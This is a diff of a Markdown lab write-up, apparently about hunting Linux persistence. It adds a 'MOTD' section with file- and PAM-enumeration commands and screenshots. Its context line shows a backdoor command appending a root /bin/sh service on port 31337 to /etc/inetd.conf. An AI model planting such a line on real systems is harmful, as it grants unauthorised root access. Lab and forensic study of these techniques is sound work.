@@ -361,3 +361,28 @@ echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf
   
 </details>
 
+---
+<details>
+  <summary><strong>MOTD</strong></summary>
+
+```bash
+find / -user george 2>/dev/null
+```
+<img width="1103" height="136" alt="image" src="https://github.com/user-attachments/assets/331b165f-6d1b-42b7-8929-b9dae2637d6c" />
+
+<br>
+<br>
+
+```bash
+dpkg -l | grep -i pam
+```
+<img width="1103" height="142" alt="image" src="https://github.com/user-attachments/assets/8c45a4c8-bd6e-4df2-92ff-2bea7d83dc3d" />
+
+<br>
+<br>
+
+<img width="1103" height="204" alt="image" src="https://github.com/user-attachments/assets/9182c4f8-154e-4020-b544-ecf3300a242b" />
+
+
+  
+</details>
